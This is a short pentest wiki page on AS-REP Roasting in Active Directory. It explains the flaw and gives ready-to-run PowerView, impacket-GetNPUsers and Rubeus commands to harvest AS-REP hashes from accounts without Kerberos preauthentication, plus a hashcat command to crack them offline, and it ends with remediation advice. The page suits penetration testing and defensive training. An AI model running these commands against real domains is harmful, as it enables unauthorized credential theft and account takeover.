---
layout: default
title: AS-REP Roasting
parent: Active Directory
nav_order: 1
permalink: /ad/asreproasting/
---

# AS-REP Roasting
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

AS-REP Roasting consists in identifying domain users that have the attribute `DONT_REQ_PREAUTH` enabled. With such an attribute, anyone can send an AS-REQ request on behalf of these users and recieve an AS-REP message. This message contains data encrypted with the user key, derived from its password. Therefore, it's possible to crack offline the password of the corresponding user.

This attack can be performed without any initial domain account. Nevertheless, a domain account is needed to list domain accounts vulnerable to AS-REP Roasting. Without, you'll have to guess them.

## Prerequisites

- Low privileged domain account (to enumerate vulnerable domain users).
- Target must be a domain user with “*Do not require Kerberos preauthentication*” (DONT_REQ_PREAUTH) enabled.

## Exploit

To enumerate vulnerable accounts, use following command. It's also possible to do with with `BloodHound`.

```bash
# Using PowerView from a domain joined computer.
Get-DomainUser -PreauthNotRequired -verbose
```

If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with `Rubeus` or `impacket-GetNPUsers`.

```bash
# From Kali.
impacket-GetNPUsers -dc-ip $DC_IP -request -outputfile hashes.asreproast $DOMAIN/$USERNAME:$PASSWORD

# From a domain joined computer.
.\Rubeus.exe asreproast /outfile:hashes.asreproast /nowrap

# From a Windows computer not joined to the domain.
.\Rubeus.exe asreproast /creduser:$DOMAIN\$USERNAME /credpassword:$PASSWORD /domain:$DOMAIN /dc:$DC_IP /outfile:hashes.asreproast /nowrap
```

Then, crack the AS-REP hash. You can use `hashcat` to do that.

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



## Recommendations

- [ ]  Disable “*Do not require Kerberos preauthentication*” for domain users when it’s technically possible.
- [ ]  If disabling “*Do not require Kerberos preauthentication*” isn’t technically possible, enforce strong password for involved domain users so it makes it hard - even impossible - to crack them.